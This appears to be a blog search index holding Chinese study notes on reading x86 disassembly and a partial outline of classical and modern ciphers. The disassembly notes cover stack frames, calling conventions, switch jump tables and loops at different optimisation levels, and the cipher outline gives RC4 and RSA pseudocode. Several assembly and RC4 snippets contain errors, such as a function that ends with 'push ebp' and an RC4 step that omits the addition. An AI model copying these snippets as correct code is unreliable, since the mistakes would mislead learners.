<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>反汇编代码分析</title>
      <link href="/posts/f62ba5bb.html"/>
      <url>/posts/f62ba5bb.html</url>
      
        <content type="html"><![CDATA[<h1 id="反汇编代码分析"><a href="#反汇编代码分析" class="headerlink" title="反汇编代码分析"></a>反汇编代码分析</h1><blockquote><p><a href=".\b81b1ca5">text::masm32汇编</a></p><p><a href=".\68e517a">text::逆向工具</a></p></blockquote><hr><h2 id="一、函数分析"><a href="#一、函数分析" class="headerlink" title="一、函数分析"></a>一、函数分析</h2><h3 id="1-系统函数"><a href="#1-系统函数" class="headerlink" title="1 系统函数"></a>1 系统函数</h3><blockquote><p>系统函数是库中自带的函数，相关程序如OD可以将其直接分析出来。</p><p>下面仅举出一些例子，实际系统函数有很多。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相关系统函数</span></span><br><span class="line"><span class="comment">// 图形显示函数</span></span><br><span class="line"><span class="built_in">MessageBoxA</span>(); <span class="comment">//ASCII码版本</span></span><br><span class="line"><span class="built_in">MessageBoxW</span>(); <span class="comment">//Unicode版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="built_in">printf</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络函数</span></span><br><span class="line"><span class="built_in">sokcet</span>();</span><br></pre></td></tr></table></figure><h3 id="2-用户函数"><a href="#2-用户函数" class="headerlink" title="2 用户函数"></a>2 用户函数</h3><blockquote><p>用户自己编写的函数。</p><p>call会入栈EIP一次，retn会出栈一次，所以一段栈中的存储大致如下：<br>【栈顶】局部变量 | 上一函数EBP | 上一函数的EIP 【栈底】</p><p>所以一般而言：</p><p>[EBP - ?? ]：本函数的局部变量<br>[EBP + ??]：上一函数的局部变量</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;空函数必做的事 void fun()&#123;&#125;</span><br><span class="line">push ebp ;保存上一函数的栈底，同时esp会增加，esp此时指向了当前函数的栈底。</span><br><span class="line">mov ebp,esp ;把esp给ebp，让ebp做栈底，之后操作改变的偶数esp的值。</span><br><span class="line">pop ebp ;出栈，获得上一函数栈底，esp此时指向的应该是上一函数栈顶。</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">;分配空间 void fun()&#123;int a=3,b=5; char c=1;&#125;</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0C ;局部变量存在栈，开辟空间，会4对齐，所以是0x0C</span><br><span class="line">mov dword ptr [local.1],3</span><br><span class="line">mov dword ptr [local.2],5</span><br><span class="line">mov byte ptr [lcoal.3+3],1</span><br><span class="line">mov esp,ebp ;复原基址，返回上一函数</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">;参数传递 </span><br><span class="line">;void main()&#123; printf(add(3,6)); &#125;</span><br><span class="line">;int add(int a,int b)&#123; return a+b; &#125;</span><br><span class="line">;主函数</span><br><span class="line">push 6 ;传参，逆向入栈，便于正向出栈</span><br><span class="line">push 3</span><br><span class="line">call add</span><br><span class="line">add esp,8 ;恢复栈，保持栈平衡</span><br><span class="line">;add函数</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">mov eax,dword ptr [ebp+8]</span><br><span class="line">mov eax,dword ptr [ebp+0C]</span><br><span class="line">push ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h3 id="3-调用约定"><a href="#3-调用约定" class="headerlink" title="3 调用约定"></a>3 调用约定</h3><blockquote><p>VC：配置属性——C/C++——高级——调用约定</p><p>调用约定可以写在函数前，如 <code>int __cdecl add()&#123;&#125;</code></p><p>C中不加说明默认<code>__cdecl</code>。</p><p>c++也一样，但是默认调用方式可以在IDE（开发环境）中修改。</p><p>带有可变参数的函数必须用<code>__cdecl</code>方式。如：<code>int printf(char* fmtstr,...);</code></p></blockquote><ol><li><p>cdecl</p><blockquote><p><code>__cdecl</code>是C Declaration的缩写，所以参数是从右到左依次入栈，并且参数是由调用者清除，称为手动清栈。（注：不是指程序员清栈）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;示例代码int add(int a,int b)&#123; return a+b; &#125;</span><br><span class="line">;调用代码</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">mov eax,dword ptr [arg.1]</span><br><span class="line">mov eax,dword ptr [arg.2]</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br><span class="line">;主函数</span><br><span class="line">push [arg.2] ;参数从右往左入栈</span><br><span class="line">push [arg.1]</span><br><span class="line">call func</span><br><span class="line">add esp,8 ;调用者清栈</span><br></pre></td></tr></table></figure></li><li><p>stdcall</p><blockquote><p>API 调用是 standardcall，是C++的标准调用方式，所有参数从右到左依次入栈，如果是调用类成员的话，最后一个入栈的是 this 指针。</p><p>这些堆栈中的参数由被调用的函数在返回后清除，使用的指令是 retn X，X表示参数占用的字节数（内存空间大小）。CPU在ret之后自动弹出X个字节的栈空间，称为自动清栈。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;示例代码</span><br><span class="line">;调用代码</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">mov eax,dword ptr [arg.1]</span><br><span class="line">mov eax,dword ptr [arg.2]</span><br><span class="line">pop ebp</span><br><span class="line">ret 8 ;自动清栈</span><br><span class="line">;主函数</span><br><span class="line">push [arg.2] ;参数从右往左入栈</span><br><span class="line">push [arg.1]</span><br><span class="line">call func</span><br></pre></td></tr></table></figure></li><li><p>fastcall</p><blockquote><p><code>__fastcall</code>是编译器指定的快速调用方式。</p><p>fastcall通常规定将前两个（或若干个）参数由寄存器传递，其余参数还是通过堆栈传递。</p><p>不同编译器编译的程序规定的寄存器不同，返回方式和stdcall相同。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;示例代码（假设有三个参数）</span><br><span class="line">;调用代码</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,8</span><br><span class="line">mov dword ptr [local.2],edx</span><br><span class="line">mov dword ptr [local.1],ecx</span><br><span class="line">mov eax,dword ptr [local.1]</span><br><span class="line">add eax,dword ptr [local.2]</span><br><span class="line">add eax,dword ptr [arg.3]</span><br><span class="line">pop ebp</span><br><span class="line">ret 8 ;自动清栈</span><br><span class="line">;主函数</span><br><span class="line">push [arg.3]</span><br><span class="line">mov edx,push [arg.2] ;参数从右往左入栈</span><br><span class="line">mov ecx,push [arg.1]</span><br><span class="line">call func</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="二、变量分析"><a href="#二、变量分析" class="headerlink" title="二、变量分析"></a>二、变量分析</h2><h3 id="1-指针"><a href="#1-指针" class="headerlink" title="1 指针"></a>1 指针</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;定义int *p = &amp;i;</span><br><span class="line">lea edx,[local.2] ;edx = &amp;i</span><br><span class="line">mov dword ptr [local.1],edx ;p = edx;</span><br><span class="line"></span><br><span class="line">;指针操作</span><br><span class="line">mov ebx,p</span><br><span class="line">add word ptr [ebx],0x333 ;i+=0x333（此处前面要加上单元大小，否则默认byte）</span><br></pre></td></tr></table></figure><h3 id="2-i-和-i"><a href="#2-i-和-i" class="headerlink" title="2 i++和++i"></a>2 i++和++i</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i = 0;</span><br><span class="line">;int j = i++（先赋值再加）</span><br><span class="line">mov dword ptr [local.2],0 ;j = 0</span><br><span class="line">mov ecx,dword ptr [local.1] ;ecx = i</span><br><span class="line">mov dword ptr [local.2],ecx ;j = ecx</span><br><span class="line">mov edx,dword ptr [local.1] ;edx = i</span><br><span class="line">add edx,1 ; edx = edx + 1</span><br><span class="line">mov dword ptr [local.1],edx ;i = edx</span><br><span class="line"></span><br><span class="line">;int j = ++i（先加再赋值）</span><br><span class="line">mov ecx,dword ptr [local.1] ;ecx = i</span><br><span class="line">add ecx,1 ; ecx = ecx + i</span><br><span class="line">mov dword ptr [local.1],ecx ;i = ecx</span><br><span class="line">mov edx,dword ptr [local.1] ;edx = i</span><br><span class="line">mov dword ptr [local.2],edx ;j = edx</span><br><span class="line"></span><br><span class="line">;完全优化：int i=0;int j=i++;printf(&quot;%d&quot;,j);j=++i;printf(&quot;%d&quot;,j);</span><br><span class="line">;编译器会直接先输出0，然后i += 2，然后输出2。</span><br></pre></td></tr></table></figure><h3 id="3-浮点数"><a href="#3-浮点数" class="headerlink" title="3 浮点数"></a>3 浮点数</h3><hr><h2 id="三、结构分析"><a href="#三、结构分析" class="headerlink" title="三、结构分析"></a>三、结构分析</h2><h3 id="1-if-else"><a href="#1-if-else" class="headerlink" title="1 if-else"></a>1 if-else</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>,b = <span class="number">2</span>; <span class="comment">//正常赋值</span></span><br><span class="line">    <span class="keyword">if</span>(a &gt; b) </span><br><span class="line">    <span class="comment">// cmp [a],[b]</span></span><br><span class="line">    <span class="comment">// jle printf(&quot;a &lt;= b\n&quot;);不满足条件则转移，否则顺序向下执行。</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &gt; b\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="comment">// jmp short 01282100;else直接被翻译成jmp跳转到结束位置</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &lt;= b\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 设此处地址01282100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-switch-else"><a href="#2-switch-else" class="headerlink" title="2 switch-else"></a>2 switch-else</h3><h4 id="2-1-普通形式"><a href="#2-1-普通形式" class="headerlink" title="2.1 普通形式"></a>2.1 普通形式</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;switch-case\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// mov dword ptr [ebp-4],3</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span>(a)</span><br><span class="line">    <span class="comment">// mov eax,dword ptr [ebp-4] ;这里他会自动创建一个匿名变量，值同a</span></span><br><span class="line">    <span class="comment">// mov dword ptr [ebp-8],eax ;之后他会用这个匿名变量进行比较</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">// cmp dword ptr [ebp-8],1 </span></span><br><span class="line">        <span class="comment">// je addr</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// jmp addr ;不写break会没有jmp导致向下执行。</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;2\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;3\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// jmp addr</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 整体结构如下</span></span><br><span class="line"><span class="comment">// 1.赋值</span></span><br><span class="line">mov eax,dword ptr [ebp<span class="number">-4</span>] </span><br><span class="line">mov dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="comment">// 2.一堆cmp和je</span></span><br><span class="line">cmp dword ptr [ebp<span class="number">-8</span>],<span class="number">1</span> </span><br><span class="line">je addr</span><br><span class="line">cmp dword ptr [ebp<span class="number">-8</span>],<span class="number">2</span></span><br><span class="line">je addr  </span><br><span class="line">cmp dword ptr [ebp<span class="number">-8</span>],<span class="number">3</span> </span><br><span class="line">je addr  </span><br><span class="line">jmp addr <span class="comment">// defalut</span></span><br><span class="line"><span class="comment">// 3.每个case执行的操作，顺序存储</span></span><br><span class="line"><span class="function">call <span class="title">printf</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">jmp addr</span></span><br><span class="line"><span class="function">call <span class="title">printf</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function">jmp addr</span></span><br><span class="line"><span class="function">call <span class="title">printf</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line"><span class="function">jmp addr</span></span><br><span class="line"><span class="function"><span class="title">printf</span><span class="params">(<span class="string">&quot;default&quot;</span>)</span></span></span><br></pre></td></tr></table></figure><h4 id="2-2-跳转表"><a href="#2-2-跳转表" class="headerlink" title="2.2 跳转表"></a>2.2 跳转表</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;switch-case\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">switch</span>(a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x13</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x13\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x15</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x15\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x10</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x10\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x20</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x20\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x22</span>:<span class="built_in">printf</span>(<span class="string">&quot;0x22\n&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:<span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00341080  PUSH EBP</span><br><span class="line">00341081  MOV EBP,ESP</span><br><span class="line">00341083  SUB ESP,8</span><br><span class="line">00341086  PUSH 汇编语言.00342100                       ; /Arg1 = 00342100 ASCII &quot;switch-case&quot;</span><br><span class="line">0034108B  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341090  ADD ESP,4</span><br><span class="line"></span><br><span class="line">00341093  MOV DWORD PTR SS:[EBP-8],20</span><br><span class="line">0034109A  MOV EAX,DWORD PTR SS:[EBP-8]</span><br><span class="line">0034109D  MOV DWORD PTR SS:[EBP-4],EAX</span><br><span class="line">003410A0  MOV ECX,DWORD PTR SS:[EBP-4]</span><br><span class="line"></span><br><span class="line">003410A3  SUB ECX,10 ; a-10，就是a减去case中的最小值</span><br><span class="line">003410A6  MOV DWORD PTR SS:[EBP-4],ECX</span><br><span class="line">003410A9  CMP DWORD PTR SS:[EBP-4],12 ;因为case中最大为0x22，最小0x10，所以范围是12。如果a-10不落在0-12中表示不是这里的面的值，直接下面跳转结束，否则会有一个跳转表，计算出的值会对应跳转到一个指定的地址，输出指定的值。</span><br><span class="line">003410AD  JA SHORT 汇编语言.0034110B</span><br><span class="line"></span><br><span class="line">003410AF  MOV EDX,DWORD PTR SS:[EBP-4] ;落在范围内则找表跳转到指定位置</span><br><span class="line">003410B2  MOVZX EAX,BYTE PTR DS:[EDX+341144]</span><br><span class="line">003410B9  JMP DWORD PTR DS:[EAX*4+34112C]</span><br><span class="line"></span><br><span class="line">003410C0  PUSH 汇编语言.00342110                       ; /Arg1 = 00342110 ASCII &quot;0x13&quot;</span><br><span class="line">003410C5  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410CA  ADD ESP,4</span><br><span class="line">003410CD  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410CF  PUSH 汇编语言.00342118                       ; /Arg1 = 00342118 ASCII &quot;0x15&quot;</span><br><span class="line">003410D4  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410D9  ADD ESP,4</span><br><span class="line">003410DC  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410DE  PUSH 汇编语言.00342120                       ; /Arg1 = 00342120 ASCII &quot;0x10&quot;</span><br><span class="line">003410E3  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410E8  ADD ESP,4</span><br><span class="line">003410EB  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410ED  PUSH 汇编语言.00342128                       ; /Arg1 = 00342128 ASCII &quot;0x20&quot;</span><br><span class="line">003410F2  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">003410F7  ADD ESP,4</span><br><span class="line">003410FA  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">003410FC  PUSH 汇编语言.00342130                       ; /Arg1 = 00342130 ASCII &quot;0x22&quot;</span><br><span class="line">00341101  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341106  ADD ESP,4</span><br><span class="line">00341109  JMP SHORT 汇编语言.00341118</span><br><span class="line"></span><br><span class="line">0034110B  PUSH 汇编语言.00342138                       ; /Arg1 = 00342138 ASCII &quot;default&quot;</span><br><span class="line">00341110  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341115  ADD ESP,4</span><br><span class="line"></span><br><span class="line">00341118  PUSH 汇编语言.00342140                       ; /Arg1 = 00342140 ASCII &quot;end&quot;</span><br><span class="line">0034111D  CALL 汇编语言.00341040                       ; \汇编语言.00341040</span><br><span class="line">00341122  ADD ESP,4</span><br><span class="line"></span><br><span class="line">00341125  XOR EAX,EAX</span><br><span class="line">00341127  MOV ESP,EBP</span><br><span class="line">00341129  POP EBP</span><br><span class="line">0034112A  RETN</span><br></pre></td></tr></table></figure><h3 id="3-for"><a href="#3-for" class="headerlink" title="3 for"></a>3 for</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (int i = 1; i &lt;= 10; ++i)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;优化/Od（无优化）</span><br><span class="line">push ecx ;入栈ecx，不需要关心ecx的值，只是开辟栈存i而已</span><br><span class="line">00591091 MOV DWORD PTR SS:[EBP-4],1 ;赋初值</span><br><span class="line">00591098 JMP SHORT 汇编语言.005910A3 ;进入循环</span><br><span class="line">;循环</span><br><span class="line">0059109A MOV EAX,DWORD PTR SS:[EBP-4] ;++i</span><br><span class="line">0059109D ADD EAX,1</span><br><span class="line">005910A0 MOV DWORD PTR SS:[EBP-4],EAX</span><br><span class="line">005910A3 CMP DWORD PTR SS:[EBP-4],0A ;i&gt;10结束</span><br><span class="line">005910A7 JG SHORT 汇编语言.005910BC</span><br><span class="line">005910A9 MOV ECX,DWORD PTR SS:[EBP-4]</span><br><span class="line">005910AC PUSH ECX ;Arg2</span><br><span class="line">005910AD PUSH 汇编语言.00592108 ;Arg1 = 00592108 ASCII &quot;%d&quot;</span><br><span class="line">005910B2 CALL 汇编语言.00591040 ;printf(&quot;%d&quot;,i);</span><br><span class="line">005910B7 ADD ESP,8</span><br><span class="line">005910BA JMP SHORT 汇编语言.0059109A</span><br><span class="line"></span><br><span class="line">;优化/O1（大小优化，指令变少）</span><br><span class="line">;可能还会有 mov edi, dword ptr [&lt;&amp;MSUCR100printf&gt;]，call edi的指令，这也是一种优化</span><br><span class="line">00311034 PUSH ESI ;保护esi</span><br><span class="line">0031103F XOR ESI,ESI ;esi=0</span><br><span class="line">00311042 INC ESI ;先i=1</span><br><span class="line">;循环</span><br><span class="line">00311043 PUSH ESI ;Arg2</span><br><span class="line">00311044 PUSH 汇编语言.00312108 ;Arg1,ASCII &quot;%d&quot;</span><br><span class="line">00311049 CALL 汇编语言.00311006</span><br><span class="line">0031104E INC ESI</span><br><span class="line">0031104F POP ECX ;两次pop相当于上面的ADD ESP,8，保证堆栈平衡</span><br><span class="line">00311050 POP ECX</span><br><span class="line">00311051 CMP ESI,0A</span><br><span class="line">00311054 JLE SHORT 汇编语言.00311043 ;i&lt;=10继续循环</span><br><span class="line">;循环结束</span><br><span class="line">00311056 POP ESI ;取出esi</span><br><span class="line"></span><br><span class="line">;优化/O2（速度优化）</span><br><span class="line">00851040  PUSH ESI</span><br><span class="line">0085104E  MOV ESI,1 ;i=1</span><br><span class="line">;循环开始</span><br><span class="line">00851053  PUSH ESI ; Arg2</span><br><span class="line">00851054  PUSH 汇编语言.00852108 ; Arg1 = 00852108 ASCII &quot;%d&quot;</span><br><span class="line">00851059  CALL 汇编语言.00851010 ; 汇编语言.00851010</span><br><span class="line">0085105E  INC ESI</span><br><span class="line">0085105F  ADD ESP,8</span><br><span class="line">00851062  CMP ESI,0A</span><br><span class="line">00851065  JLE SHORT 汇编语言.00851053</span><br><span class="line">;循环结束</span><br><span class="line">00851067  POP ESI</span><br><span class="line"></span><br><span class="line">;优化/Ox（完全优化）</span><br><span class="line">;该实例代码优化结果基本同/O2</span><br></pre></td></tr></table></figure><h3 id="4-while-do-while"><a href="#4-while-do-while" class="headerlink" title="4 while/do-while"></a>4 while/do-while</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; while(i&lt;=10)&#123;&#125;</span><br><span class="line">loop:</span><br><span class="line">cmp dowrd ptr [local1],0A</span><br><span class="line">jg end</span><br><span class="line">statement</span><br><span class="line">jmp loop</span><br><span class="line">end:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">; do&#123;&#125;while(i&lt;=10);</span><br><span class="line">loop:</span><br><span class="line">statement</span><br><span class="line">cmp dowrd ptr [local.1],0A </span><br><span class="line">jle loop</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 汇编语言 </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学密码知识</title>
      <link href="/posts/7302411.html"/>
      <url>/posts/7302411.html</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto密码"><a href="#Crypto密码" class="headerlink" title="Crypto密码"></a>Crypto密码</h1><blockquote><p><a href=".\30ce291f">text::Crypto理论</a></p><p><a href="https://github.com/Magialeaf/Course/tree/main/Crypto">my::部分密码实现</a></p></blockquote><hr><h2 id="一、古典密码"><a href="#一、古典密码" class="headerlink" title="一、古典密码"></a>一、古典密码</h2><h3 id="1-置换加密"><a href="#1-置换加密" class="headerlink" title="1 置换加密"></a>1 置换加密</h3><h4 id="1-1-凯撒"><a href="#1-1-凯撒" class="headerlink" title="1.1 凯撒"></a>1.1 凯撒</h4><h3 id="2-代换加密"><a href="#2-代换加密" class="headerlink" title="2 代换加密"></a>2 代换加密</h3><h4 id="2-1-hill"><a href="#2-1-hill" class="headerlink" title="2.1 hill"></a>2.1 hill</h4><h3 id="3-词频分析"><a href="#3-词频分析" class="headerlink" title="3 词频分析"></a>3 词频分析</h3><blockquote><p><a href="https://quipqiup.com/">词频分析网站</a></p></blockquote><hr><h2 id="二、现代密码"><a href="#二、现代密码" class="headerlink" title="二、现代密码"></a>二、现代密码</h2><h3 id="1-流密码"><a href="#1-流密码" class="headerlink" title="1 流密码"></a>1 流密码</h3><h4 id="1-1-A5算法"><a href="#1-1-A5算法" class="headerlink" title="1.1 A5算法"></a>1.1 A5算法</h4><h4 id="1-2-RC4算法"><a href="#1-2-RC4算法" class="headerlink" title="1.2 RC4算法"></a>1.2 RC4算法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化S</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">0</span> to <span class="number">255</span>:</span><br><span class="line">    S[i] = i</span><br><span class="line">    T[i] = Key[ i % keylen ]</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i =  <span class="number">0</span> to <span class="number">255</span>:</span><br><span class="line">j = (j + S[i] + T[i]) mod <span class="number">256</span></span><br><span class="line">Swap(S[i] , S[j])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 随机序列生成</span></span><br><span class="line">i,j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i = ( i + <span class="number">1</span>) mod <span class="number">256</span></span><br><span class="line">    j = ( j + S[i] ) mod <span class="number">256</span> </span><br><span class="line">    Swap( S[i] , S[j] )</span><br><span class="line">    t = ( S[i] , S[j] ) mod <span class="number">256</span></span><br><span class="line">    K = S[t]</span><br></pre></td></tr></table></figure><h3 id="2-分组密码"><a href="#2-分组密码" class="headerlink" title="2 分组密码"></a>2 分组密码</h3><h4 id="2-1-DES"><a href="#2-1-DES" class="headerlink" title="2.1 DES"></a>2.1 DES</h4><h4 id="2-2-AES"><a href="#2-2-AES" class="headerlink" title="2.2 AES"></a>2.2 AES</h4><h3 id="3-Hash密码"><a href="#3-Hash密码" class="headerlink" title="3 Hash密码"></a>3 Hash密码</h3><h4 id="3-1-Md5"><a href="#3-1-Md5" class="headerlink" title="3.1 Md5"></a>3.1 Md5</h4><blockquote><p><a href="http://www.paper.edu.cn/scholar/paper/wangxiaoyun-2">md5碰撞</a></p></blockquote><h4 id="3-2-Hash-256"><a href="#3-2-Hash-256" class="headerlink" title="3.2 Hash-256"></a>3.2 Hash-256</h4><blockquote><p><a href="https://zhuanlan.zhihu.com/p/94619052">一文读懂SHA256算法原理及其实现 - 知乎 (zhihu.com)</a></p><p><a href="https://sha256algorithm.com/">Sha256 Algorithm Explained</a></p></blockquote><h3 id="4-公钥密码"><a href="#4-公钥密码" class="headerlink" title="4 公钥密码"></a>4 公钥密码</h3><h4 id="4-1-RSA"><a href="#4-1-RSA" class="headerlink" title="4.1 RSA"></a>4.1 RSA</h4><blockquote><p><a href="https://xz.aliyun.com/t/2446">常见问题</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 质数p q ... 任取（可以不止两个）</span></span><br><span class="line">n = p * q * ...</span><br><span class="line"><span class="comment"># 求欧拉函数</span></span><br><span class="line">φ( n ) = ( p - <span class="number">1</span> ) * ( q - <span class="number">1</span> ) * ...</span><br><span class="line"><span class="comment"># e为公钥，任取小于φ( n )的数</span></span><br><span class="line">gcd( e , φ(n) ) = <span class="number">1</span></span><br><span class="line"><span class="comment"># d为私钥</span></span><br><span class="line">d = e^-<span class="number">1</span> mod φ( n )</span><br><span class="line"><span class="comment"># 加密，c = m ** e % n </span></span><br><span class="line">c = <span class="built_in">pow</span>( m , e , n ) </span><br><span class="line"><span class="comment"># 解密，m = c ** d % n</span></span><br><span class="line">m = <span class="built_in">pow</span> ( c , d , n )</span><br></pre></td></tr></table></figure><h4 id="4-2-ECC"><a href="#4-2-ECC" class="headerlink" title="4.2 ECC"></a>4.2 ECC</h4><hr><h2 id="三、其他密码"><a href="#三、其他密码" class="headerlink" title="三、其他密码"></a>三、其他密码</h2><blockquote><p><a href="https://www.cnblogs.com/hell0w/p/8254126.html">在线密码工具</a></p></blockquote><h3 id="1-当代编码"><a href="#1-当代编码" class="headerlink" title="1 当代编码"></a>1 当代编码</h3><h4 id="1-1-二战诗歌密码"><a href="#1-1-二战诗歌密码" class="headerlink" title="1.1 二战诗歌密码"></a>1.1 二战诗歌密码</h4><blockquote><p><a href="https://www.cnblogs.com/lingxuer/p/15022287.html">二战诗歌密码加解密</a></p><p>带有关键词的诗歌，如：all，for，die。</p></blockquote><h3 id="2-现代编码"><a href="#2-现代编码" class="headerlink" title="2 现代编码"></a>2 现代编码</h3><h4 id="2-1-rabbit"><a href="#2-1-rabbit" class="headerlink" title="2.1 rabbit"></a>2.1 rabbit</h4><blockquote><p><a href="https://www.sojson.com/encrypt_rabbit.html">rabbit加解密</a></p><p>特点：头为 U2F。</p></blockquote><h4 id="2-2-Ook"><a href="#2-2-Ook" class="headerlink" title="2.2 Ook"></a>2.2 Ook</h4><blockquote><p><a href="https://tool.bugku.com/brainfuck/">Ook加解密</a></p><p>特点：Ook. Ook? Ook!</p></blockquote><h4 id="2-3-阴阳怪气密码"><a href="#2-3-阴阳怪气密码" class="headerlink" title="2.3 阴阳怪气密码"></a>2.3 